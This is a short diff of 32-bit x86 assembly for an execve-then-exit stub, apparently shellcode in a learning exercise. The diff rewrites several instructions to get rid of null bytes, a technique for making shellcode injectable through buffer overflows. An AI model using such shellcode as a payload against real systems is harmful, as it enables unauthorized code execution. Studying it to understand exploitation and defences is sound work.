@@ -12,22 +12,24 @@ section .text
 		pop esi
 
 		; create the arg array to feed to execve
-		push 0x0
+		xor edx, edx
+		push edx
 		push esi
 
 		; set execve parameters
-		xor edx, edx
 		mov ecx, esp
 		mov ebx, esi
 
 		; invoke execve system call
-		mov eax, 0xb
+		xor eax, eax
+		mov al, 0xb
 		int 0x80
 	
 		; if we've made it this far, then execve has failed and 
 		; we need to exit gracefully
 		xor ebx, ebx
-		mov eax, 0x1
+		xor eax, eax
+		inc eax
 		int 0x80
 	
 	
